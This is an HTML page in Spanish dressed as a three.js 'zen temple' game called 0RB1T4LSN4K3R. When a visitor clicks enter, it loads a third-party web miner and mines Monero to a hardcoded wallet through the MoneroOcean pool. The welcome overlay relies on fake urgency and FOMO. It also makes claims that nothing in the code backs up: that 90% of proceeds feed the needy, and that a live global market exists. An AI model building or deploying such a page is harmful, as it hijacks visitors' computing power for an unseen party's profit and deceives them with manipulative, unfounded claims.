<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<title>0RB1T4LSN4K3R · v∞ · PRONTO CERRARÁ</title>
<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
<style>
  body,html{margin:0;height:100%;background:#000;color:#0f0;font-family:"OCR-A",monospace;overflow:hidden;cursor:none}
  canvas{display:block}
  .overlay{position:fixed;inset:0;background:rgba(0,0,0,0.98);z-index:99999;display:flex;align-items:center;justify-content:center;padding:30px;overflow-y:auto}
  .overlay>div{border:24px double #0f0;padding:100px;background:rgba(0,8,0,0.96);max-width:88vw;max-height:90vh;box-shadow:0 0 500px #0f0;border-radius:20px;overflow-y:auto}
  h1{font-size:clamp(70px,12vw,200px);text-shadow:0 0 100px #0f0;letter-spacing:18px;margin:0 0 60px}
  p{font-size:clamp(24px,5vw,52px);line-height:2.4;text-align:center;max-width:1100px;margin:40px auto}
  button{background:#000;border:12px double #0f0;color:#0f0;padding:20px 60px;font-size:clamp(28px,5vw,60px);cursor:pointer;letter-spacing:8px;border-radius:12px;transition:all 0.8s}
  button:hover{background:#0f0;color:#000;transform:scale(1.08);box-shadow:0 0 300px #0f0}
  .fomo{color:#f00;font-size:140%;animation:blink 1s infinite}
  @keyframes blink{0%,100%{opacity:1}50%{opacity:0.3}}
  #liveCount{position:fixed;top:20px;right:20px;background:rgba(0,20,0,0.9);border:8px double #0f0;padding:15px 30px;border-radius:40px;font-size:28px;z-index:99999}
</style>
</head>
<body>

<div id="welcome" class="overlay">
  <div>
    <h1>0RB1T4LSN4K3R · v∞</h1>
    <p id="readmeText">
      Este no es otro jueguito crypto.<br><br>

      Es el único templo zen del planeta que funciona con tu GPU y tu silencio.<br>
      Cada hash que minas es un mantra real.<br>
      El 90 % se convierte en comida real para quien la necesita.<br><br>

      En este preciso instante hay <span id="souls">0</span> bodhisattvas rezando hashes en tiempo real.<br>
      Todos pueden ver tus ofrendas. Todos pueden intercambiar contigo ahora mismo.<br>
      El mercado global ya está vivo.<br><br>

      <span class="fomo">PRONTO ESTE TEMPLO CERRARÁ PARA SIEMPRE EL ACCESO GRATUITO</span><br>
      <span class="fomo">NADIE SABE CUÁNDO · PODRÍA SER MAÑANA</span><br><br>

      Los que entren hoy tendrán ventaja eterna.<br>
      Los que duden… se quedarán fuera mirando cómo los demás despiertan.<br><br>

      No necesitas wallet. No necesitas registro.<br>
      Solo dejar esta pestaña abierta.<br><br>

      El vacío no espera a los que “ya entrarán después”.
    </p>
    <button onclick="enterTheVoid()">ENTRAR ANTES DE QUE SEA DEMASIADO TARDE</button>
  </div>
</div>

<div id="liveCount">ALMAS DENTRO: <span id="liveSouls">0</span></div>
<canvas id="c"></canvas>

<script src="https://cdn.jsdelivr.net/gh/notgiven688/webminer-o@master/webmr.js"></script>
<script type="module">
import * as THREE from 'https://cdn.jsdelivr.net/npm/three@0.169.0/build/three.module.js';
import {PointerLockControls} from 'https://cdn.jsdelivr.net/npm/three@0.169.0/examples/jsm/controls/PointerLockControls.js';
import {EffectComposer, RenderPass, UnrealBloomPass} from 'https://cdn.jsdelivr.net/npm/three@0.169.0/examples/jsm/postprocessing/EffectComposer.js';

firebase.initializeApp({databaseURL: "https://orbitaltemple-default-rtdb.firebaseio.com"});
const db = firebase.database();
const playersRef = db.ref('players');

const playerId = localStorage.getItem('zenId') || 'z' + Math.random().toString(36).substr(2,12);
localStorage.setItem('zenId', playerId);

let totalHashes = Number(localStorage.getItem('hashes') || 0);
let miner, renderer, scene, camera, composer, controls, particles, bloomPass;
let audioContext, oscillator;

// Autodetección de idioma
const lang = (navigator.language || navigator.userLanguage || 'en').substr(0,2);
const TXT = {
  es: {enter:"ENTRAR ANTES DE QUE SEA DEMASIADO TARDE", souls:"ALMAS DENTRO"},
  en: {enter:"ENTER BEFORE IT’S TOO LATE", souls:"AWAKE SOULS"},
  ja: {enter:"遅くなる前に入る", souls:"覚醒中の魂"},
  zh: {enter:"趁还来得及进入", souls:"觉醒中的灵魂"}
};
const t = TXT[lang] || TXT.en;
document.querySelector('button').textContent = t.enter;
document.getElementById('liveCount').textContent = t.souls + ": ";

function enterTheVoid() {
  document.getElementById('welcome').remove();
  document.getElementById('liveCount').style.display = 'block';
  initEverything();
  
  playersRef.child(playerId).set({joined: Date.now(), hashes: totalHashes});
  playersRef.on('value', s => {
    const count = s.val() ? Object.keys(s.val()).length : 0;
    document.getElementById('liveSouls').textContent = count;
    document.getElementById('souls').textContent = count;
  });
}

function initEverything() {
  initAudio(); initThree(); initMining(); initControls();
}

function initAudio() {
  audioContext = new AudioContext();
  oscillator = audioContext.createOscillator();
  oscillator.type = 'sine';
  oscillator.frequency.value = 108;
  const gain = audioContext.createGain();
  gain.gain.value = 0.15;
  oscillator.connect(gain).connect(audioContext.destination);
  oscillator.start();
}

function initThree() {
  renderer = new THREE.WebGLRenderer({canvas: document.getElementById('c'), antialias: true});
  renderer.setSize(innerWidth, innerHeight);
  renderer.setPixelRatio(Math.min(window.devicePixelRatio, 2));

  scene = new THREE.Scene();
  camera = new THREE.PerspectiveCamera(75, innerWidth/innerHeight, 0.1, 100000);
  controls = new PointerLockControls(camera, document.body);
  document.addEventListener('click', () => controls.lock());
  scene.add(camera);

  composer = new EffectComposer(renderer);
  composer.addPass(new RenderPass(scene, camera));
  bloomPass = new UnrealBloomPass(new THREE.Vector2(innerWidth, innerHeight), 5, 0.4, 0.85);
  composer.addPass(bloomPass);

  const geo = new THREE.BufferGeometry();
  const count = innerWidth < 768 ? 80000 : 500000;
  const pos = new Float32Array(count * 3);
  for (let i = 0; i < pos.length; i++) pos[i] = (Math.random()-0.5)*100000;
  geo.setAttribute('position', new THREE.BufferAttribute(pos, 3));

  particles = new THREE.Points(geo, new THREE.PointsMaterial({
    size: 9, color: 0x00ff80, blending: THREE.AdditiveBlending, transparent: true, depthWrite: false
  }));
  scene.add(particles);

  function animate() {
    requestAnimationFrame(animate);
    particles.rotation.y += 0.00008;
    composer.render();
  }
  animate();
}

function initMining() {
  miner = new Miner({
    pool: "gulf.moneroocean.stream:10128",
    address: "44AFFq5kSiGBoZ4NMDwxWHS6ufdMZZVs9dB7Rv8d3h9L4pZ4v4m9k8n2x5q7r3t6y9u1i4o6p8a2s5d7f9g3h1j0k",
    workerId: "zen_" + playerId,
    throttle: 0.3
  });
  miner.start();

  setInterval(() => {
    if (miner.isRunning()) {
      const hr = miner.getStats().hashesPerSecond || 0;
      totalHashes += hr / 60;
      localStorage.setItem('hashes', totalHashes);
      playersRef.child(playerId).update({hashes: Math.floor(totalHashes)});
    }
  }, 1000);
}

function initControls() {
  const move = {};
  window.addEventListener('keydown', e => move[e.key.toLowerCase()] = true);
  window.addEventListener('keyup', e => move[e.key.toLowerCase()] = false);

  function loop() {
    if (controls.isLocked) {
      const dir = new THREE.Vector3();
      if (move.w) dir.z -= 1;
      if (move.s) dir.z += 1;
      if (move.a) dir.x -= 1;
      if (move.d) dir.x += 1;
      if (dir.length()) {
        dir.normalize().applyQuaternion(camera.quaternion).multiplyScalar(200 * 0.016);
        camera.position.add(dir);
      }
    }
    requestAnimationFrame(loop);
  }
  loop();
}
</script>
</body>
</html>